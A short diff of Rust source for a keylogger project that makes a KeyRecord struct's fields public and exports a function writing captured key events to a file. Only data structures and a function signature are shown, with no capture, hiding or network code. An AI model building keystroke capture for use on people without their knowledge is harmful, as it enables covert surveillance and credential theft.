@@ -1,14 +1,13 @@
 use std::fs::OpenOptions;
-use std::io::{self, BufWriter, Write};
-
+use std::io::{BufWriter, Write};
 
 #[derive(Debug,Clone)]
 pub struct KeyRecord {
-    key_code: u64,
-    time: u32,  // unix time
-    key_name: String,
-    press: bool,  // release event if false
-    modifiers: String
+    pub key_code: u8,
+    pub time: u32,  // unix time
+    pub key_name: String,
+    pub press: bool,  // release event if false
+    pub modifiers: String
 }
 
 pub trait Keylogger {
@@ -21,7 +20,7 @@ pub trait Keylogger {
 
 
 
-fn write_keylog_to_file(filename: &str,
+pub fn write_keylog_to_file(filename: &str,
                         keylog: &Vec<KeyRecord>
     ) -> Result<(), &'static str> {
     let file = match OpenOptions::new()
